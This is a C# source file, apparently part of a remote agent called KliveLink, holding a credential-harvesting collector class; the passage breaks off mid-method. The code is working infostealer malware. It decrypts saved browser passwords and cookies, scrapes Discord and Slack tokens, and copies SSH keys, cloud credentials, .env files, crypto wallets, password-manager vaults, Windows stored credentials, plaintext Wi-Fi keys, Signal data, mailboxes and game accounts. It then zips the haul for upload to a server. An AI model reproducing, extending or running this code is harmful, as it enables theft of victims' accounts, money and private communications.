using System.Diagnostics;
using System.IO.Compression;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Xml.Linq;
using KliveLink.Contracts;
using Microsoft.Data.Sqlite;

namespace KliveLink.Agent.V2;

public sealed class V2CollectionBundle
{
    public V2CollectionManifest Manifest { get; set; } = new();
    public byte[] ZipBytes { get; set; } = Array.Empty<byte>();
    public string Sha256 { get; set; } = "";
}

/// <summary>
/// Tiered collection pipeline. It copies browser databases rather than opening them in place,
/// decrypts Chromium v10/v11 secrets when the DPAPI key is recoverable, and packages records plus
/// raw artifacts into one zip that is streamed to the server in chunks.
/// </summary>
public sealed class V2Collector
{
    private readonly string _agentId;
    private readonly string _tempRoot;
    private readonly List<V2CollectionRecord> _records = new();
    private readonly List<V2CollectionFile> _files = new();
    private readonly List<string> _errors = new();
    private int _fileCounter;
    private long _bytes;
    private readonly long _maxBytes;
    private string? _shadowDevice;
    private string? _shadowId;
    private bool _shadowTried;

    private sealed record ChromiumKeys(byte[]? Legacy, byte[]? AppBound);

    public V2Collector(string agentId, long maxBytes = 50 * 1024 * 1024)
    {
        _agentId = agentId;
        _maxBytes = Math.Max(1_000_000, maxBytes);
        _tempRoot = Path.Combine(Path.GetTempPath(), "klive-collect-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(_tempRoot);
    }

    /// <summary>
    /// Enumerates files while skipping directories the process cannot read and reparse
    /// points such as the legacy "My Music" junctions. A single denied folder must never
    /// abort a collection run.
    /// </summary>
    private static IEnumerable<string> EnumerateFilesSafe(string root, string pattern, bool recurse, int limit)
    {
        if (string.IsNullOrWhiteSpace(root) || !Directory.Exists(root)) yield break;
        var options = new System.IO.EnumerationOptions
        {
            RecurseSubdirectories = recurse,
            IgnoreInaccessible = true,
            AttributesToSkip = FileAttributes.ReparsePoint | FileAttributes.System,
            MatchCasing = MatchCasing.CaseInsensitive,
        };
        IEnumerator<string>? enumerator = null;
        try { enumerator = Directory.EnumerateFiles(root, pattern, options).GetEnumerator(); }
        catch { yield break; }
        using (enumerator)
        {
            for (int count = 0; count < limit; count++)
            {
                string current;
                try
                {
                    if (!enumerator.MoveNext()) break;
                    current = enumerator.Current;
                }
                catch { break; }
                yield return current;
            }
        }
    }

    private static string[] DirectoriesSafe(string root)
    {
        try { return Directory.GetDirectories(root); }
        catch { return Array.Empty<string>(); }
    }

    public async Task<V2CollectionBundle> CollectAsync(V2CollectionRequest request, CancellationToken ct)
    {
        var started = DateTimeOffset.UtcNow;
        try
        {
            var categories = new HashSet<string>(request.Categories ?? Array.Empty<string>(), StringComparer.OrdinalIgnoreCase);
            bool Want(string category) => categories.Count == 0 || categories.Contains(category);
            void Run(string label, Action action)
            {
                try { action(); }
                catch (Exception ex) { _errors.Add($"{label}: {ex.Message}"); }
            }

            if (Want("system")) Run("system", CollectSystem);
            if (Want("browser")) Run("browser", () => CollectBrowsers(ct));
            if (Want("token")) Run("token", CollectTokens);
            if (Want("secret")) Run("secret", CollectSecrets);
            if (Want("wallet")) Run("wallet", CollectWallets);
            if (Want("credential")) Run("credential", CollectWindowsCredentials);
            if (Want("wifi")) Run("wifi", CollectWifi);
            if (Want("signal")) Run("signal", CollectSignal);
            if (Want("vault")) Run("vault", CollectVault);
            if (request.Tier != V2CollectionTier.T0 && Want("password")) Run("password", CollectPasswordManagers);
            if (request.Tier != V2CollectionTier.T0 && Want("email")) Run("email", CollectEmail);
            if (request.Tier != V2CollectionTier.T0 && Want("game")) Run("game", CollectGames);
            if (request.Tier != V2CollectionTier.T0 && Want("files")) Run("files", () => CollectFiles(ct));

            var manifest = new V2CollectionManifest
            {
                SnapshotId = Guid.NewGuid().ToString("N"),
                AgentId = _agentId,
                Tier = request.Tier,
                Profile = request.Profile,
                StartedAt = started,
                CompletedAt = DateTimeOffset.UtcNow,
                Records = _records,
                Files = _files,
                Errors = _errors,
            };

            byte[] zip = BuildZip(manifest);
            return new V2CollectionBundle
            {
                Manifest = manifest,
                ZipBytes = zip,
                Sha256 = Convert.ToHexString(SHA256.HashData(zip)).ToLowerInvariant(),
            };
        }
        finally
        {
            DeleteShadow();
            try { Directory.Delete(_tempRoot, true); } catch { }
        }
    }

    private void CollectSystem()
    {
        try
        {
            var info = new V2CommandDispatcher(_agentId).GetSystemInfo();
            AddRecord("system", "system", "host", info.MachineName, null, null, "sysinfo", new Dictionary<string, string>
            {
                ["os"] = info.OsVersion,
                ["user"] = info.UserName,
                ["domain"] = info.Domain,
                ["cpu"] = info.ProcessorCount.ToString(),
                ["ramMB"] = info.TotalMemoryMB.ToString(),
                ["freeDiskMB"] = info.FreeDiskMB.ToString(),
                ["agentVersion"] = info.AgentVersion,
            });
            foreach (var process in new V2CommandDispatcher(_agentId).ListProcesses().Take(500))
            {
                AddRecord("system", "process", process.Path ?? process.ProcessName, process.ProcessName, null, null, "process", new Dictionary<string, string>
                {
                    ["pid"] = process.ProcessId.ToString(),
                    ["memoryMB"] = process.MemoryMB.ToString(),
                });
            }
        }
        catch (Exception ex) { _errors.Add("system: " + ex.Message); }
    }

    private void CollectBrowsers(CancellationToken ct)
    {
        string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        var browsers = new (string Name, string Root, string? AppDir)[]
        {
            ("chrome", Path.Combine(local, "Google", "Chrome", "User Data"), FindChromiumAppDir("chrome")),
            ("edge", Path.Combine(local, "Microsoft", "Edge", "User Data"), FindChromiumAppDir("edge")),
            ("brave", Path.Combine(local, "BraveSoftware", "Brave-Browser", "User Data"), FindChromiumAppDir("brave")),
            ("opera", Path.Combine(roaming, "Opera Software", "Opera Stable"), null),
            ("opera-gx", Path.Combine(roaming, "Opera Software", "Opera GX Stable"), null),
            ("vivaldi", Path.Combine(local, "Vivaldi", "User Data"), null),
            ("yandex", Path.Combine(local, "Yandex", "YandexBrowser", "User Data"), null),
        };

        foreach (var (name, root, appDir) in browsers)
        {
            if (ct.IsCancellationRequested) return;
            if (!Directory.Exists(root)) continue;
            try
            {
                string localState = Path.Combine(root, "Local State");
                byte[]? legacyKey = ReadLegacyChromiumKey(localState);
                byte[]? appBoundKey = ReadAppBoundChromiumKey(name, localState, appDir);
                var keys = new ChromiumKeys(legacyKey, appBoundKey);
                AddFile(localState, "browser", name + "-local-state");

                var profiles = DirectoriesSafe(root)
                    .Where(d => Path.GetFileName(d).StartsWith("Default", StringComparison.OrdinalIgnoreCase) ||
                                Path.GetFileName(d).StartsWith("Profile", StringComparison.OrdinalIgnoreCase))
                    .ToList();
                if (profiles.Count == 0) profiles.Add(root);

                foreach (string profile in profiles)
                {
                    if (ct.IsCancellationRequested) return;
                    CollectChromiumProfile(name, profile, keys);
                }
            }
            catch (Exception ex) { _errors.Add($"{name}: {ex.Message}"); }
        }

        CollectFirefox(roaming);
    }

    private void CollectChromiumProfile(string browser, string profile, ChromiumKeys keys)
    {
        string[] files = { "Login Data", "Cookies", "Network\\Cookies", "Web Data", "History", "Bookmarks", "Preferences" };
        foreach (string relative in files)
        {
            string path = Path.Combine(profile, relative);
            if (!File.Exists(path)) continue;
            AddFile(path, "browser", $"{browser}-{Path.GetFileName(profile)}-{Path.GetFileName(path)}", allowShadow: true);
        }

        string loginDb = Path.Combine(profile, "Login Data");
        if (keys.Legacy != null || keys.AppBound != null)
        {
            if (File.Exists(loginDb)) ReadChromiumLogins(browser, loginDb, keys);
        }
        string cookies = Path.Combine(profile, "Network", "Cookies");
        if (!File.Exists(cookies)) cookies = Path.Combine(profile, "Cookies");
        if ((keys.Legacy != null || keys.AppBound != null) && File.Exists(cookies))
            ReadChromiumCookies(browser, cookies, keys);
    }

    private void ReadChromiumLogins(string browser, string dbPath, ChromiumKeys keys)
    {
        string copy = CopyBrowserDb(dbPath);
        try
        {
            using var conn = new SqliteConnection($"Data Source={copy};Mode=ReadOnly;Pooling=false");
            conn.Open();
            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
            using var reader = cmd.ExecuteReader();
            while (reader.Read())
            {
                string url = reader.IsDBNull(0) ? "" : reader.GetString(0);
                string user = reader.IsDBNull(1) ? "" : reader.GetString(1);
                byte[] encrypted = reader.IsDBNull(2) ? Array.Empty<byte>() : (byte[])reader.GetValue(2);
                string? secret = DecryptChromium(encrypted, keys, false);
                AddRecord(browser, "browser.password", url, user.Length > 0 ? user : url, user, secret, url, null);
            }
        }
        catch (Exception ex) { _errors.Add($"{browser} logins: {ex.Message}"); }
        finally { TryDelete(copy); }
    }

    private void ReadChromiumCookies(string browser, string dbPath, ChromiumKeys keys)
    {
        string copy = CopyBrowserDb(dbPath);
        try
        {
            using var conn = new SqliteConnection($"Data Source={copy};Mode=ReadOnly;Pooling=false");
            conn.Open();
            using var cmd = conn.CreateCommand();
            cmd.CommandText = "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies";
            using var reader = cmd.ExecuteReader();
            while (reader.Read())
            {
                string host = reader.IsDBNull(0) ? "" : reader.GetString(0);
                string name = reader.IsDBNull(1) ? "" : reader.GetString(1);
                byte[] encrypted = reader.IsDBNull(2) ? Array.Empty<byte>() : (byte[])reader.GetValue(2);
                string? secret = DecryptChromium(encrypted, keys, true);
                DateTimeOffset? expires = reader.IsDBNull(4) ? null : ChromiumTime(reader.GetInt64(4));
                AddRecord(browser, "browser.cookie", host, name, null, secret, host, new Dictionary<string, string>
                {
                    ["path"] = reader.IsDBNull(3) ? "/" : reader.GetString(3),
                    ["secure"] = reader.IsDBNull(5) ? "false" : (reader.GetInt64(5) != 0).ToString(),
                    ["httpOnly"] = reader.IsDBNull(6) ? "false" : (reader.GetInt64(6) != 0).ToString(),
                }, expires);
            }
        }
        catch (Exception ex) { _errors.Add($"{browser} cookies: {ex.Message}"); }
        finally { TryDelete(copy); }
    }

    private void CollectFirefox(string roaming)
    {
        var roots = new[]
        {
            Path.Combine(roaming, "Mozilla", "Firefox", "Profiles"),
            Path.Combine(roaming, "Zen", "Profiles"),
            Path.Combine(roaming, "LibreWolf", "Profiles"),
            Path.Combine(roaming, "Waterfox", "Profiles"),
        };
        foreach (string root in roots)
        {
            if (!Directory.Exists(root)) continue;
            foreach (string profile in DirectoriesSafe(root))
            {
                foreach (string file in new[] { "logins.json", "key4.db", "cookies.sqlite", "places.sqlite", "prefs.js" })
                {
                    string path = Path.Combine(profile, file);
                    if (File.Exists(path)) AddFile(path, "browser", "firefox-" + Path.GetFileName(profile) + "-" + file);
                }
                AddRecord("firefox", "browser.profile", profile, Path.GetFileName(profile), null, null, null, new Dictionary<string, string>
                {
                    ["note"] = "Firefox NSS vault copied; decrypt offline or with the key4.db adapter.",
                });
            }
        }
    }

    private void CollectTokens()
    {
        string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        var roots = new[]
        {
            Path.Combine(roaming, "discord"),
            Path.Combine(roaming, "discordcanary"),
            Path.Combine(roaming, "discordptb"),
            Path.Combine(roaming, "Slack"),
            Path.Combine(roaming, "Microsoft", "Teams"),
        };
        var tokenRegex = new Regex(@"[A-Za-z0-9_\-]{24,28}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27,40}", RegexOptions.Compiled);
        foreach (string root in roots)
        {
            if (!Directory.Exists(root)) continue;
            try
            {
                foreach (string file in EnumerateFilesSafe(root, "*", true, 100_000)
                             .Where(f => f.EndsWith(".ldb", StringComparison.OrdinalIgnoreCase) ||
                                         f.EndsWith(".log", StringComparison.OrdinalIgnoreCase) ||
                                         f.EndsWith(".json", StringComparison.OrdinalIgnoreCase))
                             .Take(400))
                {
                    try
                    {
                        string text = File.ReadAllText(file, Encoding.UTF8);
                        foreach (Match match in tokenRegex.Matches(text).Cast<Match>().Take(10))
                        {
                            AddRecord("discord", "token", file, "discord-token", null, match.Value, null, null);
                        }
                    }
                    catch { }
                }
            }
            catch (Exception ex) { _errors.Add($"{root}: {ex.Message}"); }
        }
    }

    private void CollectSecrets()
    {
        string profile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        var paths = new[]
        {
            Path.Combine(profile, ".ssh", "id_rsa"), Path.Combine(profile, ".ssh", "id_ed25519"),
            Path.Combine(profile, ".ssh", "config"), Path.Combine(profile, ".aws", "credentials"),
            Path.Combine(profile, ".aws", "config"), Path.Combine(profile, ".azure"),
            Path.Combine(profile, ".kube", "config"), Path.Combine(profile, ".docker", "config.json"),
            Path.Combine(profile, ".npmrc"), Path.Combine(profile, ".pypirc"),
            Path.Combine(profile, ".git-credentials"), Path.Combine(profile, ".gitconfig"),
            Path.Combine(roaming, "gcloud", "credentials.db"),
            Path.Combine(profile, ".config", "gcloud", "credentials.db"),
        };
        foreach (string path in paths)
        {
            if (File.Exists(path)) CollectSecretFile(path, "secret");
            else if (Directory.Exists(path))
            {
                foreach (string file in EnumerateFilesSafe(path, "*", false, 30))
                    CollectSecretFile(file, "secret");
            }
        }

        foreach (string root in new[]
                 {
                     Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                     Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                     Path.Combine(profile, "Downloads"),
                 })
        {
            if (!Directory.Exists(root)) continue;
            foreach (string file in EnumerateFilesSafe(root, ".env", true, 20))
                CollectSecretFile(file, "secret");
        }
    }

    private void CollectSecretFile(string path, string category)
    {
        try
        {
            var info = new FileInfo(path);
            if (!info.Exists || info.Length > 256 * 1024) return;
            string text = File.ReadAllText(path);
            AddRecord("files", category, path, Path.GetFileName(path), null, text, null, new Dictionary<string, string>
            {
                ["size"] = info.Length.ToString(),
            });
            AddFile(path, category, "secret-" + Path.GetFileName(path));
        }
        catch { }
    }

    private void CollectWallets()
    {
        string profile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        var roots = new[]
        {
            Path.Combine(roaming, "Exodus"), Path.Combine(roaming, "Electrum", "wallets"),
            Path.Combine(roaming, "Atomic"), Path.Combine(roaming, "Ledger Live"),
            Path.Combine(roaming, "Trezor Suite"), Path.Combine(roaming, "WalletWasabi"),
            Path.Combine(roaming, "Bitcoin"), Path.Combine(roaming, "monero-wallet-gui"),
            Path.Combine(roaming, "Daedalus Mainnet", "wallets"),
            Path.Combine(local, "Google", "Chrome", "User Data", "Default", "Local Extension Settings"),
        };
        foreach (string root in roots)
        {
            if (!Directory.Exists(root)) continue;
            try
            {
                foreach (string file in EnumerateFilesSafe(root, "*", true, 100_000)
                             .Where(IsWalletFile).Take(200))
                    AddFile(file, "wallet", "wallet-" + Path.GetFileName(file));
            }
            catch (Exception ex) { _errors.Add($"{root}: {ex.Message}"); }
        }
        try
        {
            foreach (string file in EnumerateFilesSafe(profile, "wallet.dat", true, 20))
                AddFile(file, "wallet", "wallet-" + Path.GetFileName(file));
        }
        catch { }
    }

    private static bool IsWalletFile(string path)
    {
        string name = Path.GetFileName(path).ToLowerInvariant();
        return name is "wallet.dat" or "exodus.wallet" or "config.json" ||
               name.EndsWith(".keys") || name.EndsWith(".keystore") ||
               name.Contains("metamask") || name.Contains("phantom") || name.Contains("keplr");
    }

    private void CollectFiles(CancellationToken ct)
    {
        string profile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        var roots = new[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Path.Combine(profile, "Downloads"),
        };
        var extensions = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
        {
            ".txt", ".pdf", ".docx", ".xlsx", ".csv", ".json", ".yaml", ".yml", ".toml",
            ".ini", ".config", ".env", ".kdbx", ".key", ".pem", ".ppk", ".pfx", ".p12",
            ".ovpn", ".rdp", ".sql", ".zip", ".7z", ".rar",
        };
        foreach (string root in roots)
        {
            if (!Directory.Exists(root)) continue;
            try
            {
                foreach (string file in EnumerateFilesSafe(root, "*", true, 3000))
                {
                    if (ct.IsCancellationRequested) return;
                    if (!extensions.Contains(Path.GetExtension(file))) continue;
                    if (file.Contains("node_modules", StringComparison.OrdinalIgnoreCase) ||
                        file.Contains("\\Windows\\", StringComparison.OrdinalIgnoreCase)) continue;
                    AddFile(file, "files", "file-" + Path.GetFileName(file));
                }
            }
            catch (Exception ex) { _errors.Add($"{root}: {ex.Message}"); }
        }
    }

    private void CollectWindowsCredentials()
    {
        try
        {
            if (CredEnumerateW(null, 0, out int count, out IntPtr array) && array != IntPtr.Zero)
            {
                try
                {
                    for (int i = 0; i < count; i++)
                    {
                        IntPtr item = Marshal.ReadIntPtr(array, i * IntPtr.Size);
                        if (item == IntPtr.Zero) continue;
                        var credential = Marshal.PtrToStructure<CREDENTIAL>(item);
                        string target = Marshal.PtrToStringUni(credential.TargetName) ?? "";
                        string user = Marshal.PtrToStringUni(credential.UserName) ?? "";
                        string secret = "";
                        if (credential.CredentialBlob != IntPtr.Zero && credential.CredentialBlobSize > 0)
                        {
                            byte[] blob = new byte[credential.CredentialBlobSize];
                            Marshal.Copy(credential.CredentialBlob, blob, 0, blob.Length);
                            try { secret = Encoding.Unicode.GetString(blob).TrimEnd('\0'); } catch { }
                            if (string.IsNullOrWhiteSpace(secret)) secret = Encoding.UTF8.GetString(blob).TrimEnd('\0');
                        }
                        if (!string.IsNullOrWhiteSpace(target))
                            AddRecord("dpapi", "credential.windows", target, target, user, secret, null,
                                new Dictionary<string, string> { ["type"] = credential.Type.ToString() });
                    }
                }
                finally { CredFree(array); }
                return;
            }
        }
        catch (Exception ex) { _errors.Add("CredEnumerate: " + ex.Message); }

        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/d /c cmdkey /list",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true,
            };
            using var process = Process.Start(psi);
            if (process == null) return;
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit(5000);
            foreach (string block in output.Split(new[] { "\r\n\r\n", "\n\n" }, StringSplitOptions.RemoveEmptyEntries))
            {
                string? target = block.Split('\n').FirstOrDefault(l => l.TrimStart().StartsWith("Target:", StringComparison.OrdinalIgnoreCase))?.Split(':', 2).ElementAtOrDefault(1)?.Trim();
                string? user = block.Split('\n').FirstOrDefault(l => l.TrimStart().StartsWith("User:", StringComparison.OrdinalIgnoreCase))?.Split(':', 2).ElementAtOrDefault(1)?.Trim();
                if (!string.IsNullOrWhiteSpace(target))
                    AddRecord("dpapi", "credential.windows", target, target, user, null, null, new Dictionary<string, string> { ["type"] = "cmdkey" });
            }
        }
        catch (Exception ex) { _errors.Add("cmdkey: " + ex.Message); }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct CREDENTIAL
    {
        public uint Flags;
        public uint Type;
        public IntPtr TargetName;
        public IntPtr Comment;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
        public uint CredentialBlobSize;
        public IntPtr CredentialBlob;
        public uint Persist;
        public uint AttributeCount;
        public IntPtr Attributes;
        public IntPtr TargetAlias;
        public IntPtr UserName;
    }

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CredEnumerateW(string? filter, uint flags, out int count, out IntPtr credentials);

    [DllImport("advapi32.dll")]
    private static extern void CredFree(IntPtr buffer);

    private void CollectSignal()
    {
        string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string root = Path.Combine(roaming, "Signal");
        if (!Directory.Exists(root)) return;
        foreach (string file in new[] { Path.Combine(root, "config.json"), Path.Combine(root, "sql", "db.sqlite") })
            if (File.Exists(file)) AddFile(file, "messaging", "signal-" + Path.GetFileName(file));
        try
        {
            string config = Path.Combine(root, "config.json");
            if (File.Exists(config) && new FileInfo(config).Length < 64 * 1024)
                AddRecord("signal", "messaging.signal", config, "signal-config", null, File.ReadAllText(config), null, null);
        }
        catch { }
    }

    private void CollectVault()
    {
        string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string programData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
        foreach (string root in new[] { Path.Combine(roaming, "Microsoft", "Vault"), Path.Combine(programData, "Microsoft", "Vault") })
        {
            if (!Directory.Exists(root)) continue;
            try
            {
                foreach (string file in EnumerateFilesSafe(root, "*", true, 100))
                    AddFile(file, "credential", "vault-" + Path.GetFileName(file));
            }
            catch { }
        }
    }

    private void CollectWifi()    {
        try
        {
            string dir = Path.Combine(_tempRoot, "wifi");
            Directory.CreateDirectory(dir);
            var psi = new ProcessStartInfo
            {
                FileName = "netsh.exe",
                Arguments = $"wlan export profile key=clear folder=\"{dir}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
            };
            using var process = Process.Start(psi);
            process?.WaitForExit(8000);
            foreach (string xml in EnumerateFilesSafe(dir, "*.xml", false, 1000))
            {
                try
                {
                    XDocument doc = XDocument.Load(xml);
                    string? ssid = doc.Descendants().FirstOrDefault(e => e.Name.LocalName == "name")?.Value;
                    string? key = doc.Descendants().FirstOrDefault(e => e.Name.LocalName == "keyMaterial")?.Value;
                    if (!string.IsNullOrWhiteSpace(ssid))
                        AddRecord("wifi", "network.wifi", xml, ssid, null, key, null, new Dictionary<string, string> { ["profile"] = Path.GetFileName(xml) });
                    AddFile(xml, "wifi", "wifi-" + Path.GetFileName(xml));
                }
                catch { }
            }
        }
        catch (Exception ex) { _errors.Add("wifi: " + ex.Message); }
    }

    private void CollectPasswordManagers()
    {
        string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        var roots = new[]
        {
            Path.Combine(local, "1Password"), Path.Combine(roaming, "1Password"),
            Path.Combine(roaming, "Bitwarden"), Path.Combine(local, "Bitwarden"),
            Path.Combine(roaming, "KeePassXC"), Path.Combine(roaming, "KeePass"),
            Path.Combine(roaming, "LastPass"), Path.Combine(roaming, "Dashlane"),
            Path.Combine(roaming, "NordPass"), Path.Combine(roaming, "Keeper"),
        };
        foreach (string root in roots)
        {
            if (!Directory.Exists(root)) continue;
            try
            {
                foreach (string file in EnumerateFilesSafe(root, "*", true, 100_000)
                             .Where(f => f.EndsWith(".json", StringComparison.OrdinalIgnoreCase) ||
                                         f.EndsWith(".sqlite", StringComparison.OrdinalIgnoreCase) ||
                                         f.EndsWith(".db", StringComparison.OrdinalIgnoreCase) ||
                                         f.EndsWith(".kdbx", StringComparison.OrdinalIgnoreCase))
                             .Take(100))
                {
                    AddFile(file, "password", "vault-" + Path.GetFileName(file));
                    if (new FileInfo(file).Length < 256 * 1024)
                    {
                        try
                        {
                            AddRecord("password", "vault", file, Path.GetFileName(file), null, File.ReadAllText(file), null, null);
                        }
                        catch { }
                    }
                }
            }
            catch (Exception ex) { _errors.Add($"{root}: {ex.Message}"); }
        }
        foreach (string root in new[] { docs, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads") })
        {
            if (!Directory.Exists(root)) continue;
            try
            {
                foreach (string file in EnumerateFilesSafe(root, "*.kdbx", true, 20))
                    AddFile(file, "password", "keepass-" + Path.GetFileName(file));
            }
            catch { }
        }
    }

    private void CollectEmail()
    {
        string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        var roots = new[]
        {
            Path.Combine(roaming, "Thunderbird", "Profiles"),
            Path.Combine(roaming, "Microsoft", "Outlook"),
            Path.Combine(local, "Microsoft", "Outlook"),
            Path.Combine(local, "Packages"),
        };
        foreach (string root in roots)
        {
            if (!Directory.Exists(root)) continue;
            try
            {
                foreach (string file in EnumerateFilesSafe(root, "*", true, 100_000)
                             .Where(f => f.EndsWith(".ost", StringComparison.OrdinalIgnoreCase) ||
                                         f.EndsWith(".pst", StringComparison.OrdinalIgnoreCase) ||
                                         f.EndsWith("logins.json", StringComparison.OrdinalIgnoreCase) ||
                                         f.EndsWith("key4.db", StringComparison.OrdinalIgnoreCase))
                             .Take(80))
                    AddFile(file, "email", "mail-" + Path.GetFileName(file));
            }
            catch (Exception ex) { _errors.Add($"{root}: {ex.Message}"); }
        }
    }

    private void CollectGames()
    {
        string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
        var files = new[]
        {
            Path.Combine(programFiles, "Steam", "config", "loginusers.vdf"),
            Path.Combine(programFiles, "Steam", "config", "config.vdf"),
            Path.Combine(roaming, "Battle.net", "Battle.net.config"),
            Path.Combine(local, "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini"),
            Path.Combine(roaming, ".minecraft", "launcher_accounts.json"),
            Path.Combine(roaming, ".minecraft", "launcher_profiles.json"),
        };
        foreach (string file in files)
        {
            if (!File.Exists(file)) continue;
            AddFile(file, "game", "game-" + Path.GetFileName(file));
            try
            {
                if (new FileInfo(file).Length < 256 * 1024)
                    AddRecord("game", "launcher", file, Path.GetFileName(file), null, File.ReadAllText(file), null, null);
            }
            catch { }
        }
    }

    private void AddRecord(string collector, string category, string source, string name,
        string? username, string? secret, string? url, Dictionary<string, string>? metadata,
        DateTimeOffset? expires = null)
    {
        _records.Add(new V2CollectionRecord
        {
            Collector = collector,
            Category = category,
            SourcePath = source,
            Name = name,
            Username = username,
            Secret = secret,
            Url = url,
            ExpiresAt = expires,
            Metadata = metadata,
        });
    }

    private void AddFile(string sourcePath, string category, string displayName, bool allowShadow = false)
    {
        string? shadowCopy = null;
        try
        {
            string source = sourcePath;
            if (allowShadow)
            {
                try { shadowCopy = CopyBrowserDb(sourcePath); source = shadowCopy; }
                catch { }
            }
            var info = new FileInfo(source);
            if (!info.Exists || info.Length == 0 || info.Length > 20 * 1024 * 1024) return;
            if (_bytes + info.Length > _maxBytes) return;
            string safe = Regex.Replace(displayName, @"[^A-Za-z0-9._-]+", "_");
            string relative = $"files/{_fileCounter++:D4}-{safe}";
            string destination = Path.Combine(_tempRoot, relative.Replace('/', Path.DirectorySeparatorChar));
            Directory.CreateDirectory(Path.GetDirectoryName(destination)!);
            using (var input = new FileStream(source, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
            using (var output = new FileStream(destination, FileMode.Create, FileAccess.Write, FileShare.None))
                input.CopyTo(output);
            string sha = Convert.ToHexString(SHA256.HashData(File.ReadAllBytes(destination))).ToLowerInvariant();
            _bytes += info.Length;
            _files.Add(new V2CollectionFile
            {
                Path = sourcePath,
                BundlePath = relative,
                Sha256 = sha,
                Size = info.Length,
            });
            _records.Add(new V2CollectionRecord
            {
                Collector = category,
                Category = category + ".file",
                SourcePath = sourcePath,
                Name = Path.GetFileName(sourcePath),
                Sha256 = sha,
                Metadata = new Dictionary<string, string> { ["bundlePath"] = relative, ["size"] = info.Length.ToString() },
            });
        }
        catch (Exception ex) { _errors.Add($"{sourcePath}: {ex.Message}"); }
        finally
        {
            if (shadowCopy != null) TryDelete(shadowCopy);
        }
    }

    private byte[] BuildZip(V2CollectionManifest manifest)
    {
        using var memory = new MemoryStream();
        using (var zip = new ZipArchive(memory, ZipArchiveMode.Create, leaveOpen: true))
        {
            var manifestEntry = zip.CreateEntry("manifest.json", CompressionLevel.Fastest);
            using (var writer = new StreamWriter(manifestEntry.Open(), Encoding.UTF8))
                writer.Write(JsonSerializer.Serialize(manifest, V2Json.Options));

            var recordsEntry = zip.CreateEntry("records.jsonl", CompressionLevel.Fastest);
            using (var writer = new StreamWriter(recordsEntry.Open(), Encoding.UTF8))
            {
                foreach (var record in manifest.Records)
                    writer.WriteLine(JsonSerializer.Serialize(record, V2Json.Options));
            }

            foreach (string file in Directory.EnumerateFiles(_tempRoot, "*", SearchOption.AllDirectories))
            {
                string relative = Path.GetRelativePath(_tempRoot, file).Replace('\\', '/');
                if (relative == "manifest.json" || relative == "records.jsonl") continue;
                var entry = zip.CreateEntry(relative, CompressionLevel.Fastest);
                using var input = File.OpenRead(file);
                using var output = entry.Open();
                input.CopyTo(output);
            }
        }
        return memory.ToArray();
    }

    private static string? FindChromiumAppDir(string browser)
    {
        string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string pf = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        string pf86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
        string exe = browser switch
        {
            "chrome" => "chrome.exe",
            "edge" => "msedge.exe",
            "brave" => "brave.exe",
            _ => "",
        };
        if (exe.Length == 0) return null;
        string[] candidates = browser switch
        {
            "chrome" => new[]
            {
                Path.Combine(local, "Google", "Chrome", "Application"),
                Path.Combine(pf, "Google", "Chrome", "Application"),
                Path.Combine(pf86, "Google", "Chrome", "Application"),
            },
            "edge" => new[]
            {
                Path.Combine(local, "Microsoft", "Edge", "Application"),
                Path.Combine(pf86, "Microsoft", "Edge", "Application"),
                Path.Combine(pf, "Microsoft", "Edge", "Application"),
            },
            "brave" => new[]
            {
                Path.Combine(local, "BraveSoftware", "Brave-Browser", "Application"),
                Path.Combine(pf, "BraveSoftware", "Brave-Browser", "Application"),
                Path.Combine(pf86, "BraveSoftware", "Brave-Browser", "Application"),
            },
            _ => Array.Empty<string>(),
        };
